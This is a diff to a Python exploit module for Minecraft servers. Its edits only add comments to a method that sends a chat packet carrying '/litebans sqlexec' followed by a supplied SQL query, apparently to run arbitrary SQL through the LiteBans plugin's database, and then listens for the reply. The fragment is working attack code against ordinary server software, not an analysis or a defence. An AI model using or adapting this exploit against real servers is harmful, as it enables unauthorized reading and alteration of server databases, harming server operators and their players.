@@ -18,10 +18,10 @@ class Exploit:
 
     def execute(self) -> tuple[bool, str]:
         self.client.register_packet_listener(
-            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)
+            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)  #: on chat, receive event
 
-        packet = minecraft.networking.packets.ChatPacket()
-        packet.message = "/litebans sqlexec {}".format(self.query)
-        self.client.write_packet(packet)
+        packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure
+        packet.message = "/litebans sqlexec {}".format(self.query)  #: assigns packet sql query
+        self.client.write_packet(packet)  #: sends message
 
         return True, "Success in Message"
